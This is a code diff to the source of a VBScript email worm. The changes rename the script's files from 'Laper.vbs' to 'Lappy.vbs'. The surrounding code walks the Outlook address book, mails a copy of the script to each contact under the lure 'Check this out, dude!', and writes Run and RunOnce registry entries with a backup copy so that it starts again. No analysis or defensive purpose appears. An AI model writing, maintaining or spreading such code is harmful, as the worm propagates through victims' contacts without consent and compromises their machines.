@@ -44,7 +44,7 @@ If objOutlook.Session.AddressLists.Count > 0 Then
         If objContact.Class = 43 Then
             Set objMail.To = objContact.Email1Address
             objMail.Body = "Check this out, dude!"
-            objMail.Attachments.Add strFilePath, 1, 0, "Laper.vbs"
+            objMail.Attachments.Add strFilePath, 1, 0, "Lappy.vbs"
             objMail.Send
         End If
     Next
@@ -75,8 +75,8 @@ objRegistry.RegWrite strRegistryPath & "\" & strRegistryKey, strRegistryValue, "
 strBackupRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
 strBackupRegistryKey = "Lappy.vbs_backup"
 
-If Not objFSO.FileExists(objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Laper.vbs")) Then
-    strBackupRegistryValue = chr(34) & objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Laper.vbs") & chr(34)
+If Not objFSO.FileExists(objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Lappy.vbs")) Then
+    strBackupRegistryValue = chr(34) & objFSO.BuildPath(objFSO.GetParentFolderName(WScript.ScriptFullName), "backup_Lappy.vbs") & chr(34)
 Else
     strBackupRegistryValue = chr(34) & strFilePath & chr(34)
 End If
